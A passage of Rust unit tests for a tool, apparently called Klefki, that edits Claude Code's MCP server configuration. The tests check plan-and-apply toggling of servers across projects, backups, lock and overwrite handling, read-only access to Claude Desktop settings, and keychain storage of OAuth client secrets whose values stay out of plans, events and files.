        assert!(d.hints.is_empty() && d.client_log.is_empty());
        let log = std::fs::read_to_string(&env.log).unwrap_or_default();
        assert!(!log.contains("--debug"), "nothing was spawned for it");
    }

    #[test]
    fn diagnose_survives_a_hung_client_and_a_missing_debug_file() {
        let rule = r#",{"args":["--debug","mcp","--debug-file","*","mcp","get","slow"],"hang":true},
                {"args":["--debug","mcp","--debug-file","*","mcp","get","quiet"],"stdout_file":"failed.txt"}"#;
        let env = diagnose_env(
            rule,
            &[("failed.txt", FAILED)],
            serde_json::json!({"slow": {"command": "x"}, "quiet": {"command": "x"}}),
        );
        let mut config = env.config();
        config.check_timeout = Duration::from_secs(3);
        let core = start_with(config, || {});
        let events = collect(&core, |e| e.iter().any(|x| matches!(x, Event::Snapshot(_))));
        let Event::Snapshot(snap) = &events[0] else {
            panic!()
        };
        for r in &snap.servers {
            core.send(Command::Diagnose(r.id()));
        }
        let events = collect(&core, |e| {
            diagnosis_of(e, "slow").is_some() && diagnosis_of(e, "quiet").is_some()
        });
        let slow = diagnosis_of(&events, "slow").unwrap();
        assert_eq!(slow.status, Status::Unknown);
        assert!(slow.note.unwrap().contains("timed out"));
        let quiet = diagnosis_of(&events, "quiet").unwrap();
        assert_eq!(
            quiet.status,
            Status::Failed,
            "the normal output is still read"
        );
        assert!(quiet.note.unwrap().contains("no debug output"));
        assert!(quiet.client_log.is_empty());
    }

    #[test]
    fn diagnose_also_updates_the_servers_status() {
        let rule = format!(
            r#",{{{},"debug_file_from":"dbg.log","stdout_file":"failed.txt"}}"#,
            diagnose_args()
        );
        let env = diagnose_env(
            &rule,
            &[("dbg.log", DEBUG_STDIO), ("failed.txt", FAILED)],
            serde_json::json!({"bad-stdio": {"command": "x"}}),
        );
        let core = env.start();
        let events = collect(&core, |e| final_status(e, "bad-stdio").is_some());
        let id = events
            .iter()
            .find_map(|e| match e {
                Event::Snapshot(s) => s.servers.first().map(|r| r.id()),
                _ => None,
            })
            .unwrap();
        core.send(Command::Diagnose(id));
        let events = collect(&core, |e| diagnosis_of(e, "bad-stdio").is_some());
        assert_eq!(final_status(&events, "bad-stdio"), Some(Status::Failed));
    }

    // ---- changing the configuration

    fn config_json(env: &Env) -> serde_json::Value {
        let text =
            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap();
        serde_json::from_str(&text).unwrap()
    }

    fn write_config(env: &Env, value: &serde_json::Value) {
        std::fs::write(
            env.dir.path().join("cfg").join(".claude.json"),
            serde_json::to_string_pretty(value).unwrap(),
        )
        .unwrap();
    }

    /// Two projects, a user server with a secret, and a local server in one of them.
    fn two_projects(env_dir_hint: &str) -> serde_json::Value {
        serde_json::json!({
            "numStartups": 3,
            "mcpServers": {"gw": {"type": "stdio", "command": "node", "env": {"TOKEN": "s3cret-value"}}},
            "projects": {
                "/work/a": {"mcpServers": {"loc": {"type": "stdio", "command": "x"}}, "disabledMcpServers": []},
                "/work/b": {"disabledMcpServers": ["other"]}
            },
            "tail": env_dir_hint
        })
    }

    fn quiet_env(claude_json: &serde_json::Value) -> Env {
        Env::new(claude_json, r#"{"rules":[]}"#, &[])
    }

    fn user_id(name: &str) -> ServerId {
        ServerId::new(Scope::User, None, name)
    }

    fn local_id(name: &str, project: &str) -> ServerId {
        ServerId::new(Scope::Local, Some(project), name)
    }

    fn plan_for(core: &Core, changes: Vec<Change>) -> PlanView {
        core.send(Command::Prepare(changes));
        let events = collect(core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::PlanReady(_) | Event::PlanFailed(_)))
        });
        events
            .iter()
            .find_map(|e| match e {
                Event::PlanReady(p) => Some(p.clone()),
                _ => None,
            })
            .unwrap_or_else(|| panic!("a plan, got {events:?}"))
    }

    fn disabled_list(env: &Env, project: &str) -> serde_json::Value {
        config_json(env)["projects"][project]["disabledMcpServers"].clone()
    }

    #[test]
    fn switching_a_user_server_off_covers_every_known_project() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        assert!(!plan.nothing_to_do);
        assert!(
            plan.warnings.iter().any(|w| w.contains("2 projects")),
            "{:?}",
            plan.warnings
        );
        core.send(Command::Apply(plan.id));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
                && e.iter().any(|x| {
                    matches!(x, Event::Snapshot(s)
                        if s.servers.iter().any(|r| r.name == "gw" && !r.enabled))
                })
        });
        assert!(events.iter().any(|e| matches!(
            e,
            Event::Applied {
                backup: Some(_),
                ..
            }
        )));
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["gw"]));
        assert_eq!(
            disabled_list(&env, "/work/b"),
            serde_json::json!(["other", "gw"])
        );
        // Everything else is as it was, in the same order.
        let now = config_json(&env);
        let keys: Vec<_> = now.as_object().unwrap().keys().cloned().collect();
        assert_eq!(keys, ["numStartups", "mcpServers", "projects", "tail"]);
        assert_eq!(now["mcpServers"], two_projects("end")["mcpServers"]);
    }

    #[test]
    fn switching_a_user_server_back_on_removes_it_everywhere() {
        let mut start = two_projects("end");
        start["projects"]["/work/a"]["disabledMcpServers"] = serde_json::json!(["gw"]);
        start["projects"]["/work/b"]["disabledMcpServers"] = serde_json::json!(["gw", "other"]);
        let env = quiet_env(&start);
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: true,
            }],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!([]));
        assert_eq!(disabled_list(&env, "/work/b"), serde_json::json!(["other"]));
    }

    #[test]
    fn a_local_server_is_switched_in_its_own_project_only() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["loc"]));
        assert_eq!(disabled_list(&env, "/work/b"), serde_json::json!(["other"]));
    }

    #[test]
    fn several_changes_make_one_plan_and_one_backup() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![
                Change::SetEnabled {
                    id: local_id("loc", "/work/a"),
                    enabled: false,
                },
                Change::SetEnabled {
                    id: user_id("gw"),
                    enabled: false,
                },
            ],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        assert_eq!(
            disabled_list(&env, "/work/a"),
            serde_json::json!(["loc", "gw"])
        );
        assert_eq!(
            std::fs::read_dir(env.dir.path().join("backups"))
                .unwrap()
                .count(),
            1
        );
    }

    #[test]
    fn the_plan_never_shows_server_settings() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        let shown = format!("{plan:?}");
        assert!(shown.contains("gw") && !shown.contains("s3cret"), "{shown}");
    }

    #[test]
    fn a_plan_can_be_applied_once_and_not_after_it_is_discarded() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let change = Change::SetEnabled {
            id: local_id("loc", "/work/a"),
            enabled: false,
        };
        let first = plan_for(&core, vec![change.clone()]);
        core.send(Command::Apply(first.id));
        core.send(Command::Apply(first.id));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
                && e.iter().any(|x| matches!(x, Event::ApplyFailed { .. }))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::ApplyFailed { plan, .. } if *plan == first.id))
        );
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["loc"]));

        let second = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: true,
            }],
        );
        core.send(Command::Discard(second.id));
        core.send(Command::Apply(second.id));
        collect(&core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::ApplyFailed { plan, .. } if *plan == second.id))
        });
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["loc"]));
    }

    #[test]
    fn a_server_that_is_gone_makes_no_plan() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        core.send(Command::Prepare(vec![Change::SetEnabled {
            id: user_id("ghost"),
            enabled: false,
        }]));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::PlanFailed(_)))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::PlanFailed(m) if m.contains("ghost")))
        );
        assert!(!events.iter().any(|e| matches!(e, Event::PlanReady(_))));
    }

    #[test]
    fn a_change_that_is_already_true_is_reported_as_nothing_to_do() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: true,
            }],
        );
        assert!(plan.nothing_to_do);
        core.send(Command::Apply(plan.id));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        assert!(events.iter().any(|e| matches!(
            e,
            Event::Applied {
                changed: false,
                backup: None,
                ..
            }
        )));
        assert!(!env.dir.path().join("backups").exists());
    }

    fn activity(core: &Core) -> crate::activity::Activity {
        core.send(Command::Activity);
        let events = collect(core, |e| e.iter().any(|x| matches!(x, Event::Activity(_))));
        events
            .into_iter()
            .find_map(|e| match e {
                Event::Activity(a) => Some(a),
                _ => None,
            })
            .unwrap()
    }

    #[test]
    fn claude_desktop_is_read_only_when_asked_and_never_written() {
        let env = quiet_env(&two_projects("end"));
        let roaming = env.dir.path().join("Roaming");
        let file = roaming.join("Claude").join(crate::desktop::FILE_NAME);
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        let text = r#"{"mcpServers": {"files": {"command": "npx", "args": ["-y", "fs"]}}}"#;
        std::fs::write(&file, text).unwrap();
        let before = std::fs::metadata(&file).unwrap().modified().unwrap();
        let core = start_with(
            EngineConfig {
                desktop: crate::desktop::DesktopRoots {
                    roaming: Some(roaming),
                    packages: None,
                },
                ..env.config()
            },
            || {},
        );
        // Starting up reads Claude Code's configuration, not Claude Desktop's.
        let events = collect(&core, |e| e.iter().any(|x| matches!(x, Event::Snapshot(_))));
        assert!(!events.iter().any(|e| matches!(e, Event::Desktop(_))));
        for _ in 0..2 {
            core.send(Command::Desktop);
            let events = collect(&core, |e| e.iter().any(|x| matches!(x, Event::Desktop(_))));
            let desktop = events
                .into_iter()
                .find_map(|e| match e {
                    Event::Desktop(d) => Some(d),
                    _ => None,
                })
                .unwrap();
            let names: Vec<&str> = desktop.servers.iter().map(|s| s.name.as_str()).collect();
            assert_eq!(names, ["files"]);
            assert_eq!(desktop.servers[0].target, "npx -y fs");
        }
        assert_eq!(std::fs::read_to_string(&file).unwrap(), text);
        assert_eq!(
            std::fs::metadata(&file).unwrap().modified().unwrap(),
            before
        );
        // Nothing else was put next to it either.
        assert_eq!(
            std::fs::read_dir(file.parent().unwrap()).unwrap().count(),
            1
        );
    }

    #[test]
    fn a_saved_change_is_in_the_activity_log_with_its_backup() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        assert_eq!(activity(&core), crate::activity::Activity::default());
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        core.send(Command::Apply(plan.id));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        let backup = events
            .iter()
            .find_map(|e| match e {
                Event::Applied { backup, .. } => backup.clone(),
                _ => None,
            })
            .unwrap();
        let log = activity(&core);
        assert_eq!(log.problem, None);
        let [entry] = &log.entries[..] else {
            panic!("one entry: {log:?}");
        };
        assert_eq!(entry.summary, plan.summary);
        assert_eq!(entry.failed, None);
        assert_eq!(entry.backups.len(), 1);
        assert_eq!(entry.backups[0].path, backup);
        assert!(entry.backups[0].kept);
        assert_eq!(entry.backups[0].of, ".claude.json");
    }

    #[test]
    fn a_change_that_writes_nothing_is_not_logged() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: true,
            }],
        );
        assert!(plan.nothing_to_do);
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        assert!(activity(&core).entries.is_empty());
        assert!(!env.dir.path().join("activity.jsonl").exists());
    }

    #[test]
    fn a_user_server_cannot_be_switched_when_no_project_is_known() {
        let env = quiet_env(
            &serde_json::json!({"mcpServers": {"gw": {"type": "stdio", "command": "x"}}}),
        );
        let core = env.start();
        core.send(Command::Prepare(vec![Change::SetEnabled {
            id: user_id("gw"),
            enabled: false,
        }]));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::PlanFailed(_)))
        });
    }

    #[test]
    fn toggling_a_project_server_writes_only_the_user_file_and_does_not_approve_it() {
        let env = quiet_env(&serde_json::json!({}));
        let repo = env.dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        std::fs::write(
            repo.join(".mcp.json"),
            r#"{"mcpServers":{"ps":{"type":"stdio","command":"danger"}}}"#,
        )
        .unwrap();
        let key = repo.to_string_lossy().replace('\\', "/");
        write_config(&env, &serde_json::json!({"projects": {key.clone(): {}}}));
        let core = env.start();
        let id = ServerId::new(Scope::Project, Some(&key), "ps");
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: id.clone(),
                enabled: true,
            }],
        );
        assert!(
            plan.warnings.iter().any(|w| w.contains("not approved")),
            "{:?}",
            plan.warnings
        );
        let plan = plan_for(&core, vec![Change::SetEnabled { id, enabled: false }]);
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        assert_eq!(
            config_json(&env)["projects"][&key]["disabledMcpServers"],
            serde_json::json!(["ps"])
        );
        // The repository was not touched: no approval file, same .mcp.json.
        assert!(!repo.join(".claude").exists());
        assert_eq!(
            std::fs::read_to_string(repo.join(".mcp.json")).unwrap(),
            r#"{"mcpServers":{"ps":{"type":"stdio","command":"danger"}}}"#
        );
    }

    #[test]
    fn a_lock_held_by_claude_stops_the_write_with_a_clear_message() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        let before =
            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap();
        std::fs::create_dir(env.dir.path().join("cfg").join(".claude.json.lock")).unwrap();
        core.send(Command::Apply(plan.id));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::ApplyFailed { .. }))
        });
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .unwrap();
        assert!(error.contains("writing its configuration"), "{error}");
        assert_eq!(
            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap(),
            before
        );
    }

    #[test]
    fn a_change_claude_overwrites_a_moment_later_is_put_back() {
        let env = quiet_env(&two_projects("end"));
        let mut config = env.config();
        config.verify_delay = Duration::from_millis(800);
        let core = start_with(config, || {});
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        // Claude saves an older copy without taking the lock, with a newer counter of its own.
        let mut theirs = two_projects("end");
        theirs["numStartups"] = serde_json::json!(4);
        write_config(&env, &theirs);
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Reapplied { .. }))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Reapplied { plan: p } if *p == plan.id))
        );
        let now = config_json(&env);
        assert_eq!(now["numStartups"], 4);
        assert_eq!(
            now["projects"]["/work/a"]["disabledMcpServers"],
            serde_json::json!(["loc"])
        );
    }

    /// Applies `changes` and waits for the answer.
    fn apply_now(core: &Core, changes: Vec<Change>) {
        let plan = plan_for(core, changes);
        core.send(Command::Apply(plan.id));
        collect(core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
    }

    /// Events that arrive within `window`, without waiting for any in particular.
    fn events_for(core: &Core, window: Duration) -> Vec<Event> {
        let until = Instant::now() + window;
        let mut events = Vec::new();
        while Instant::now() < until {
            while let Some(e) = core.try_recv() {
                events.push(e);
            }
            std::thread::sleep(Duration::from_millis(20));
        }
        events
    }

    #[test]
    fn switching_back_right_away_is_not_undone_by_the_first_change() {
        let env = quiet_env(&two_projects("end"));
        let mut config = env.config();
        config.verify_delay = Duration::from_millis(600);
        let core = start_with(config, || {});
        let loc = local_id("loc", "/work/a");
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: loc.clone(),
                enabled: false,
            }],
        );
        // Within the first change's verify window, the user switches it back on.
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: loc,
                enabled: true,
            }],
        );
        let events = events_for(&core, Duration::from_millis(3000));
        assert!(
            !events
                .iter()
                .any(|e| matches!(e, Event::Reapplied { .. } | Event::ApplyFailed { .. })),
            "{events:#?}"
        );
        assert_eq!(
            config_json(&env)["projects"]["/work/a"]["disabledMcpServers"],
            serde_json::json!([])
        );
    }

    #[test]
    fn claude_overwriting_after_two_quick_changes_loses_neither() {
        // Found reviewing main: the first change's check stood down for the second, whose check only put its own
        // change back, so the first was silently lost.
        let env = quiet_env(&two_projects("end"));
        let mut config = env.config();
        config.verify_delay = Duration::from_millis(600);
        let core = start_with(config, || {});
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        // Claude saves a copy it read before either change, without the lock.
        let mut theirs = two_projects("end");
        theirs["numStartups"] = serde_json::json!(9);
        write_config(&env, &theirs);
        let events = events_for(&core, Duration::from_millis(3000));
        assert!(
            events.iter().any(|e| matches!(e, Event::Reapplied { .. })),
            "{events:#?}"
        );
        let now = config_json(&env);
        assert_eq!(now["numStartups"], 9, "Claude's own change stays");
        assert_eq!(
            now["projects"]["/work/a"]["disabledMcpServers"],
            serde_json::json!(["loc", "gw"])
        );
    }

    #[test]
    fn a_later_change_that_writes_nothing_still_has_the_earlier_one_checked() {
        // The variant: the second change finds nothing to write, yet it numbers last on the file.
        let env = quiet_env(&two_projects("end"));
        let mut config = env.config();
        config.verify_delay = Duration::from_millis(600);
        let core = start_with(config, || {});
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        // Already off: nothing to write.
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        write_config(&env, &two_projects("end"));
        events_for(&core, Duration::from_millis(3000));
        assert_eq!(
            config_json(&env)["projects"]["/work/a"]["disabledMcpServers"],
            serde_json::json!(["loc"])
        );
    }

    #[test]
    fn a_later_change_to_another_server_still_leaves_both_in_place() {
        let env = quiet_env(&two_projects("end"));
        let mut config = env.config();
        config.verify_delay = Duration::from_millis(600);
        let core = start_with(config, || {});
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        let events = events_for(&core, Duration::from_millis(3000));
        assert!(
            !events
                .iter()
                .any(|e| matches!(e, Event::Reapplied { .. } | Event::ApplyFailed { .. })),
            "{events:#?}"
        );
        let disabled = &config_json(&env)["projects"]["/work/a"]["disabledMcpServers"];
        let names: Vec<&str> = disabled
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|v| v.as_str())
            .collect();
        assert!(names.contains(&"loc") && names.contains(&"gw"), "{names:?}");
    }

    // ---- client secrets in the system's store (an in-memory one here: tests never touch the real keychain)

    fn oauth_env() -> Env {
        quiet_env(&serde_json::json!({
            "mcpServers": {
                "sso": {"type": "http", "url": "https://sso.example.com/mcp", "oauth": {"clientId": "klefki-1"}},
                "plain": {"type": "http", "url": "https://plain.example.com/mcp"}
            },
            "projects": {"/work/a": {}}
        }))
    }

    fn with_store(env: &Env, store: Arc<crate::secrets::MemoryStore>) -> Core {
        let mut config = env.config();
        config.secrets = Some(store);
        start_with(config, || {})
    }

    fn secret_status(core: &Core, id: &ServerId) -> Result<bool, String> {
        collect(core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::SecretStatus { id: i, .. } if i == id))
        })
        .into_iter()
        .rev()
        .find_map(|e| match e {
            Event::SecretStatus { id: i, stored } if i == *id => Some(stored),
            _ => None,
        })
        .unwrap()
    }

    #[test]
    fn a_client_secret_is_stored_read_and_forgotten_under_its_connection() {
        let env = oauth_env();
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let sso = user_id("sso");
        core.send(Command::SecretStatus(sso.clone()));
        assert_eq!(secret_status(&core, &sso), Ok(false));
        core.send(Command::StoreSecret {
            id: sso.clone(),
            secret: crate::secrets::Secret::new("s3cret-value".into()),
        });
        assert_eq!(secret_status(&core, &sso), Ok(true));
        let key = format!(
            "conn:{}",
            crate::model::ConnectionId::new(Scope::User, None, "sso").as_str()
        );
        assert_eq!(
            store.values.lock().unwrap().get(&key).map(String::as_str),
            Some("s3cret-value"),
            "keyed like v1, under dev.klefki"
        );
        core.send(Command::ForgetSecret(sso.clone()));
        assert_eq!(secret_status(&core, &sso), Ok(false));
        assert!(store.values.lock().unwrap().is_empty());
    }

    #[test]
    fn secrets_are_refused_where_they_do_not_belong_and_the_value_never_travels_back() {
        let env = oauth_env();
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        for (id, why) in [(user_id("plain"), "OAuth"), (user_id("ghost"), "no longer")] {
            core.send(Command::StoreSecret {
                id: id.clone(),
                secret: crate::secrets::Secret::new("s3cret-value".into()),
            });
            let err = secret_status(&core, &id).unwrap_err();
            assert!(err.contains(why), "{err}");
        }
        assert!(store.values.lock().unwrap().is_empty());
        // An empty secret is not a secret.
        core.send(Command::StoreSecret {
            id: user_id("sso"),
            secret: crate::secrets::Secret::new(String::new()),
        });
        assert!(
            secret_status(&core, &user_id("sso"))
                .unwrap_err()
                .contains("empty")
        );
        core.send(Command::StoreSecret {
            id: user_id("sso"),
            secret: crate::secrets::Secret::new("s3cret-value".into()),
        });
        assert_eq!(secret_status(&core, &user_id("sso")), Ok(true));
        let everything = format!("{:?}", events_for(&core, Duration::from_millis(200)));
        assert!(!everything.contains("s3cret"), "{everything}");
    }

    #[test]
    fn without_a_secret_store_nothing_is_kept_anywhere() {
        let env = oauth_env();
        let store = Arc::new(crate::secrets::MemoryStore::default());
        *store.fail.lock().unwrap() = Some(crate::secrets::SecretError::Unavailable(
            "no Secret Service".into(),
        ));
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        core.send(Command::StoreSecret {
            id: user_id("sso"),
            secret: crate::secrets::Secret::new("s3cret-value".into()),
        });
        let err = secret_status(&core, &user_id("sso")).unwrap_err();
        assert!(err.contains("no plaintext copy"), "{err}");
        // Not written next to the configuration either.
        let dump = walk(env.dir.path());
        assert!(!dump.contains("s3cret"), "{dump}");
    }

    // ---- the Secrets page

    fn secrets_report(core: &Core) -> crate::secret_uses::Secrets {
        core.send(Command::Secrets);
        collect(core, |e| e.iter().any(|x| matches!(x, Event::Secrets(_))))
            .into_iter()
            .find_map(|e| match e {
                Event::Secrets(s) => Some(s),
                _ => None,
            })
            .unwrap()
    }

    fn secrets_env() -> Env {
        quiet_env(&serde_json::json!({
            "mcpServers": {
                "sso": {"type": "http", "url": "https://sso.example.com/mcp", "oauth": {"clientId": "klefki-1"}},
                "gh": {"command": "npx", "env": {"GITHUB_TOKEN": "ghp_0123456789abcdefghijABCDEFGHIJ012345", "LOG_LEVEL": "debug"}},
                "ref": {"type": "http", "url": "https://ref.example.com/", "headers": {"Authorization": "Bearer ${REF_TOKEN}"}},
                "plain": {"command": "node", "args": ["server.js"]}
            },
            "projects": {"/work/a": {"mcpServers": {"sso2": {"type": "http", "url": "https://sso2.example.com/", "oauth": {"clientId": "c2"}}}}}
        }))
    }

    #[test]
    fn the_secrets_page_says_where_each_secret_lives_without_any_value() {
        use crate::secret_uses::{Place, SecretKind};
        let env = secrets_env();
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let gone = crate::model::ConnectionId::new(Scope::User, None, "gone");
        for (id, value) in [
            (user_id("sso").connection, "s3cret-one"),
            (gone.clone(), "s3cret-two"),
        ] {
            store
                .set(&id, &crate::secrets::Secret::new(value.into()))
                .unwrap();
        }
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let report = secrets_report(&core);
        let places: Vec<(String, SecretKind, String, Place)> = report
            .servers
            .iter()
            .flat_map(|s| {
                s.uses
                    .iter()
                    .map(|u| (s.id.name.clone(), u.kind, u.name.clone(), u.place.clone()))
            })
            .collect();
        assert_eq!(
            places,
            [
                // Typed in first.
                (
                    "gh".into(),
                    SecretKind::Env,
                    "GITHUB_TOKEN".into(),
                    Place::Written {
                        instead: Some("${GITHUB_TOKEN}".into())
                    }
                ),
                (
                    "sso".into(),
                    SecretKind::ClientSecret,
                    "".into(),
                    Place::Store(Some(true))
                ),
                (
                    "ref".into(),
                    SecretKind::Header,
                    "Authorization".into(),
                    Place::Environment(vec!["REF_TOKEN".into()])
                ),
            ]
        );
        assert!(
            report.servers[0].file.ends_with(".claude.json"),
            "{:?}",
            report.servers[0]
        );
        assert_eq!(report.written(), 1);
        let unused: Vec<&str> = report.unused.iter().map(|u| u.name.as_str()).collect();
        assert_eq!(unused, ["gone"]);
        assert_eq!(report.store_problem, None);
        let everything = format!("{report:?}");
        for value in ["s3cret", "ghp_0123"] {
            assert!(!everything.contains(value), "{everything}");
        }
    }

    #[test]
    fn unused_means_unused_in_this_configuration_and_the_report_names_it() {
        // Cross-review B1: one store, two Claude Code configurations (CLAUDE_CONFIG_DIR). The second one cannot
        // see the first's servers, so the page must say which configuration it looked at.
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let sso = user_id("sso").connection;
        store
            .set(&sso, &crate::secrets::Secret::new("s3cret".into()))
            .unwrap();
        let second = quiet_env(&serde_json::json!({"mcpServers": {"plain": {"command": "node"}}}));
        let core = with_store(&second, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let report = secrets_report(&core);
        let unused: Vec<&str> = report.unused.iter().map(|u| u.name.as_str()).collect();
        assert_eq!(unused, ["sso"]);
        let config = second.dir.path().join("cfg").join(".claude.json");
        assert_eq!(
            report.config,
            crate::sanitize::shown(&config.display().to_string())
        );
    }

    #[test]
    fn a_file_change_reads_the_definitions_again_but_not_the_store() {
        // Cross-review N1/N2: listing the store can ask to unlock it, and Claude Code saves often.
        let env = secrets_env();
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        assert_eq!(secrets_report(&core).store_problem, None);
        *store.fail.lock().unwrap() =
            Some(crate::secrets::SecretError::Unavailable("locked".into()));
        let mut config = config_json(&env);
        config["mcpServers"]["new"] =
            serde_json::json!({"command": "x", "env": {"API_TOKEN": "${API_TOKEN}"}});
        write_config(&env, &config);
        core.send(Command::Refresh { live_all: false });
        collect(&core, |e| !snapshots(e).is_empty());
        core.send(Command::SecretsAfterFileChange);
        let again = collect(&core, |e| e.iter().any(|x| matches!(x, Event::Secrets(_))))
            .into_iter()
            .find_map(|e| match e {
                Event::Secrets(s) => Some(s),
                _ => None,
            })
            .unwrap();
        assert_eq!(again.store_problem, None, "the store was not asked again");
        assert!(
            again.servers.iter().any(|s| s.id.name == "new"),
            "{again:?}"
        );
        // Asked on purpose (opening the page, Try again), it is.
        assert!(secrets_report(&core).store_problem.is_some());
    }

    #[test]
    fn an_unused_client_secret_is_forgotten_only_while_nothing_uses_it() {
        let env = secrets_env();
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let gone = crate::model::ConnectionId::new(Scope::User, None, "gone");
        let sso = user_id("sso").connection;
        for id in [&gone, &sso] {
            store
                .set(id, &crate::secrets::Secret::new("s3cret".into()))
                .unwrap();
        }
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let forgotten = |core: &Core, id: &crate::model::ConnectionId| {
            core.send(Command::ForgetUnusedSecret(id.clone()));
            let events = collect(core, |e| e.iter().any(|x| matches!(x, Event::Secrets(_))));
            let result = events
                .iter()
                .find_map(|e| match e {
                    Event::UnusedSecretForgotten { connection, result } if connection == id => {
                        Some(result.clone())
                    }
                    _ => None,
                })
                .expect("an answer before the new list");
            let report = events
                .into_iter()
                .find_map(|e| match e {
                    Event::Secrets(s) => Some(s),
                    _ => None,
                })
                .unwrap();
            (result, report)
        };
        let (result, report) = forgotten(&core, &gone);
        assert_eq!(result, Ok(()));
        assert!(report.unused.is_empty(), "{report:?}");
        assert!(store.get(&gone).unwrap().is_none());
        // A server's own client secret is not Forget's to take, whatever the page showed.
